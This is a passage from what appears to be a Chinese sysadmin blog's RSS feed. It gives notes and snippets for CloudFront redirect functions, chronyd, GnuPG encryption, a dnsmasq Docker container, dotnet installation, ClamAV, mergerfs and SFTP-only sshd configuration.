&lt;li&gt;编写 &lt;code&gt;CloudFront Function&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;创建一个 &lt;code&gt;CloudFront Function&lt;/code&gt;，代码如下（直接处理请求并返回重定向）：
&lt;tab-container default-tab="1" placement="top" type="underline"&gt;&lt;button class="tab-button" type="button" role="tab" id="tab-id-4" aria-selected="false"&gt;version 1.0&lt;/button&gt;&lt;button class="tab-button" type="button" role="tab" id="tab-id-5" aria-selected="true"&gt;version 2.0&lt;/button&gt;&lt;button class="tab-button" type="button" role="tab" id="tab-id-6" aria-selected="false"&gt;version 3.0&lt;/button&gt;
&lt;div role="tabpanel" aria-labelledby="tab-id-4" class="tab-panel"&gt;&lt;pre&gt;&lt;code&gt;function handler(event) {
 var request = event.request;
 var host = request.headers.host.value;

 // 判断是否是非 www 请求（例如 example.com）
 if (host === &amp;#39;example.com&amp;#39;) {
 return {
 statusCode: 301,
 statusDescription: &amp;#39;Moved Permanently&amp;#39;,
 headers: {
 &amp;#39;location&amp;#39;: { value: `https://www.${host}${request.uri}` },
 &amp;#39;cache-control&amp;#39;: { value: &amp;#39;max-age=3600&amp;#39; }
 }
 };
 }

 // 其他情况直接放行
 return request;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div role="tabpanel" aria-labelledby="tab-id-5" class="tab-panel"&gt;&lt;pre&gt;&lt;code&gt;// 该版本未进行实际测试，通过 gpt 编写
function handler(event) {
 var request = event.request;
 var host = request.headers.host.value;

 // 跳转规则列表
 var redirectRules = {
 &amp;#39;example.com&amp;#39;: &amp;#39;www.example.com&amp;#39;
 };

 // 检查当前host是否需要跳转
 if (redirectRules.hasOwnProperty(host)) {
 return {
 statusCode: 301,
 statusDescription: &amp;#39;Moved Permanently&amp;#39;,
 headers: {
 &amp;#39;location&amp;#39;: { value: `https://${redirectRules[host]}${request.uri}` },
 &amp;#39;cache-control&amp;#39;: { value: &amp;#39;max-age=3600&amp;#39; }
 }
 };
 }

 // 其他情况直接放行
 return request;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div role="tabpanel" aria-labelledby="tab-id-6" class="tab-panel"&gt;&lt;pre&gt;&lt;code&gt;function handler(event) {
 var request = event.request;
 var host = request.headers.host.value.toLowerCase();
 var uri = request.uri;

 // -----------------------------------------
 // 1. Host 跳转规则
 // -----------------------------------------
 var redirectRules = {
 &amp;#39;example.com&amp;#39;: &amp;#39;www.example.com&amp;#39;
 };

 if (redirectRules[host]) {
 return {
 statusCode: 301,
 statusDescription: &amp;#39;Moved Permanently&amp;#39;,
 headers: {
 location: { value: `https://${redirectRules[host]}${uri}` }
 }
 };
 }

 // -----------------------------------------
 // 2. Trailing Slash SEO 优化
 // -----------------------------------------

 // // 需要排除不加 / 的路径（灵活配置）
 // var noSlashWhitelist = [
 // &amp;#39;/api&amp;#39;,
 // &amp;#39;/health&amp;#39;,
 // &amp;#39;/login&amp;#39;,
 // &amp;#39;/sso&amp;#39;
 // ];

 // // 如果在白名单中 → 不添加 /
 // if (noSlashWhitelist.includes(uri)) {
 // return request;
 // }

 // 如果已有 `/` 结尾，不处理
 if (uri.endsWith(&amp;#39;/&amp;#39;)) {
 return request;
 }

 // 如果路径包含扩展名，例如 .css, .png, .html 不处理
 if (/\.[a-zA-Z0-9]&amp;#43;$/.test(uri)) {
 return request;
 }

 // 执行 301 永久重定向到带 `/` 的版本
 return {
 statusCode: 301,
 statusDescription: &amp;#39;Moved Permanently&amp;#39;,
 headers: {
 location: { value: `https://${host}${uri}/` }
 }
 };
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/tab-container&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="2"&gt;
&lt;li&gt;配置函数参数
运行时版本：选择 &lt;code&gt;cloudfront-js-2.0&lt;/code&gt;（最新 &lt;code&gt;JavaScript&lt;/code&gt; 运行时）。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;函数名称：例如 &lt;code&gt;redirect-non-www-to-www&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="3"&gt;
&lt;li&gt;关联到 &lt;code&gt;CloudFront&lt;/code&gt; 分发&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;在目标 &lt;code&gt;CloudFront&lt;/code&gt; 分发（处理 &lt;code&gt;example.com&lt;/code&gt; 的分发）的 行为（&lt;code&gt;Behaviors&lt;/code&gt;） 中
&lt;ul&gt;
&lt;li&gt;找到需要修改的缓存行为（通常为 &lt;code&gt;Default (*)&lt;/code&gt; 或自定义路径）。&lt;/li&gt;
&lt;li&gt;在 函数关联 - 可选(&lt;code&gt;Function association - optional&lt;/code&gt;) 中选择 请求查看器(&lt;code&gt;Viewer Requests&lt;/code&gt;)：
&lt;ul&gt;
&lt;li&gt;函数类型(&lt;code&gt;Event type&lt;/code&gt;)：选择&lt;code&gt;CloudFront Functions&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;函数 ARN/名称(&lt;code&gt;Function ARN/Name&lt;/code&gt;): 选择已发布的 &lt;code&gt;CloudFront Function&lt;/code&gt; &lt;code&gt;redirect-non-www-to-www&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="chronyd-常用操作"&gt;&lt;span&gt;chronyd 常用操作&lt;/span&gt;
 &lt;a href="#chronyd-%e5%b8%b8%e7%94%a8%e6%93%8d%e4%bd%9c" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 允许其他机器使用本机的 chronyd 服务作为 时间源
$&amp;gt; vim /etc/chrony/chrony.conf
# 允许特定网段使用本机 chronyd 服务作为 时间源
allow 172.16.0.0/16

# # 允许远程机器使用 chronyc 控制 chronyd
# # 监听所有地址（默认仅本地）
# bindcmdaddress 0.0.0.0
# # 允许该网段内的客户端发送控制命令
# cmdallow 172.16.0.0/16

## 重启 chronyd 服务

# 查看同步状态
$&amp;gt; chronyc tracking

# 查看当前时间源
$&amp;gt; chronyc sources -v

# 强制重新同步
$&amp;gt; chronyc makestep

# 查看客户端连接
$&amp;gt; chronyc clients

# 查看活动连接
chronyc activity&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>那些杂七杂八的记录(一)</title><link>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/</link><pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;h2 class="heading-element" id="gnupg-加密与解密"&gt;&lt;span&gt;GnuPG 加密与解密&lt;/span&gt;
 &lt;a href="#gnupg-%e5%8a%a0%e5%af%86%e4%b8%8e%e8%a7%a3%e5%af%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="gpg-对称加密"&gt;&lt;span&gt;gpg 对称加密&lt;/span&gt;
 &lt;a href="#gpg-%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;加密: &lt;code&gt;gpg -c &amp;lt;file&amp;gt;&lt;/code&gt;， 输入两次加密密码，完成后生成文件&lt;code&gt;&amp;lt;file&amp;gt;.gpg&lt;/code&gt;(加密后源文件保留)&lt;/li&gt;
&lt;li&gt;解密: &lt;code&gt;gpg &amp;lt;file&amp;gt;.gpg&lt;/code&gt;, 输入加密密码,正确后生成文件&lt;code&gt;&amp;lt;file&amp;gt;&lt;/code&gt;(解密后加密文件保留)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="gpg-非对称加密"&gt;&lt;span&gt;gpg 非对称加密&lt;/span&gt;
 &lt;a href="#gpg-%e9%9d%9e%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;非对称加密/解密文件时，&lt;code&gt;Server&lt;/code&gt; 生成私钥与公钥，并把公钥发送给&lt;code&gt;Client&lt;/code&gt;, &lt;code&gt;Client&lt;/code&gt; 使用公钥加密数据，并把加密后的数据传给&lt;code&gt;Server&lt;/code&gt; ，&lt;code&gt;Server&lt;/code&gt; 最后使用自己的私钥解密数据。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Server: 创建公钥私钥
$&amp;gt; gpg --gen-key # 需要填写一些东西，可根据需求选择 
## 配置文件介绍
# GPG 配置文件目录:~/.gnupg
# ~/.gnupg/gpg.conf – 配置文件
# ~/.gnupg/trustdb.gpg – 信任库
# ~/.gnupg/pubring.gpg – 公钥库
# ~/.gnupg/secring.gpg – 私钥库 

$&amp;gt; gpg --list-key # 密钥查看 
$&amp;gt; gpg -a --export &amp;lt;UserID&amp;gt; &amp;gt; ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &amp;lt;UserID&amp;gt; 被标记为绝对信任 
# 将公钥传送到Client上 

# Client: 导入 公钥 
$&amp;gt; gpg --import ./public-key.pub 

# Client: 文件加密 
$&amp;gt; gpg -e -r &amp;lt;UserID&amp;gt; &amp;lt;file&amp;gt; 
&amp;lt;file&amp;gt;.gpg 
# 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥 
# Server: 文件解密 
$&amp;gt; gpg -d &amp;lt;file&amp;gt;.gpg 
&amp;lt;file&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="docker-创建-dns-server"&gt;&lt;span&gt;DOCKER 创建 DNS SERVER&lt;/span&gt;
 &lt;a href="#docker-%e5%88%9b%e5%bb%ba-dns-server" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /data/docker/dns/dnsmasq.conf 
#dnsmasq config, for a complete example, see:
# http://oss.segetech.com/intra/srv/dnsmasq.conf
#log all dns queries
log-queries
#dont use hosts nameservers
no-resolv
#use cloudflare as default nameservers, prefer 1^4
server=8.8.4.4
server=8.8.8.8
strict-order
#serve all .company queries using a specific nameserver
server=/company/10.0.0.1
#explicitly define host-ip mappings
address=/www.example.com/172.16.10.10

$&amp;gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt &amp;#34;max-size=100m&amp;#34; -e &amp;#34;HTTP_USER=root&amp;#34; -e &amp;#34;HTTP_PASS=root&amp;#34; jpillora/dnsmasq&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="dotnet-环境搭建"&gt;&lt;span&gt;dotnet 环境搭建&lt;/span&gt;
 &lt;a href="#dotnet-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
$&amp;gt; yum install libgdiplus-devel libunwind icu -y 
$&amp;gt; wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
$&amp;gt; yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
$&amp;gt; dotnet --info
# supervisor 管理 https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86
yum install supervisor -y
# 前端管理样式页面 
/usr/lib/python2.7/site-packages/supervisor/ui/status.html&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="在linux中删除virbr0接口"&gt;&lt;span&gt;在Linux中删除virbr0接口&lt;/span&gt;
 &lt;a href="#%e5%9c%a8linux%e4%b8%ad%e5%88%a0%e9%99%a4virbr0%e6%8e%a5%e5%8f%a3" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;virbr0&lt;/code&gt;是&lt;code&gt;CentOS7&lt;/code&gt;在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; virsh net-list 
$&amp;gt; virsh net-destroy default 
$&amp;gt; virsh net-undefine default
$&amp;gt; systemctl restart libvirtd.service&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="linux-杀毒软件-clamav"&gt;&lt;span&gt;Linux 杀毒软件 clamav&lt;/span&gt;
 &lt;a href="#linux-%e6%9d%80%e6%af%92%e8%bd%af%e4%bb%b6-clamav" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 需要安装epel源
$&amp;gt;　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
# 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example 
# 更新病毒库　
$&amp;gt; /usr/bin/freshclam
# 扫描 
$&amp;gt; clamscan -ri /data --remove -l /var/log/clamscan.log &lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="linux-合并文件系统-margerfs"&gt;&lt;span&gt;linux 合并文件系统 margerfs&lt;/span&gt;
 &lt;a href="#linux-%e5%90%88%e5%b9%b6%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f-margerfs" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://wzyboy.im/post/1148.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://wzyboy.im/post/1148.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/trapexit/mergerfs" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/trapexit/mergerfs&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用示例:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 挂载到的目录必须为空
# 命令挂载
$&amp;gt; mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares

# fstab
$&amp;gt; /etc/fstab
/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="linux-sftp-搭建"&gt;&lt;span&gt;linux sftp 搭建&lt;/span&gt;
 &lt;a href="#linux-sftp-%e6%90%ad%e5%bb%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)
# 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议
# 
Match Group/User www # 限制某个组或者某个用户使用以下规则
 # 仅允许使用sftp , -l INFO 表示记录 SFTP 的 INFO 级别日志。-f AUTH 指定 SFTP 鉴权日志级别为 AUTH
 ForceCommand internal-sftp -l INFO -f AUTH 
 # 禁止使用密码进行身份验证，只允许通过公钥认证
 PasswordAuthentication no 
 # 禁止 SSH 隧道功能
 PermitTunnel no
 # 禁止 SSH 代理转发 
 AllowAgentForwarding no
 # 禁止 TCP 转发
 AllowTcpForwarding no&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="监听本地网卡上没有的ip地址"&gt;&lt;span&gt;监听本地网卡上没有的IP地址&lt;/span&gt;
 &lt;a href="#%e7%9b%91%e5%90%ac%e6%9c%ac%e5%9c%b0%e7%bd%91%e5%8d%a1%e4%b8%8a%e6%b2%a1%e6%9c%89%e7%9a%84ip%e5%9c%b0%e5%9d%80" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 一般用于 keepalive &amp;#43; nginx 使用
echo &amp;#39;net.ipv4.ip_nonlocal_bind = 1&amp;#39; &amp;gt;&amp;gt; /etc/sysctl.conf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="腾讯云第二块网卡绑定公网ip"&gt;&lt;span&gt;腾讯云第二块网卡绑定公网ip&lt;/span&gt;
 &lt;a href="#%e8%85%be%e8%ae%af%e4%ba%91%e7%ac%ac%e4%ba%8c%e5%9d%97%e7%bd%91%e5%8d%a1%e7%bb%91%e5%ae%9a%e5%85%ac%e7%bd%91ip" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;官方文档是有记录的，这儿记录下服务器上的设置&lt;/p&gt;
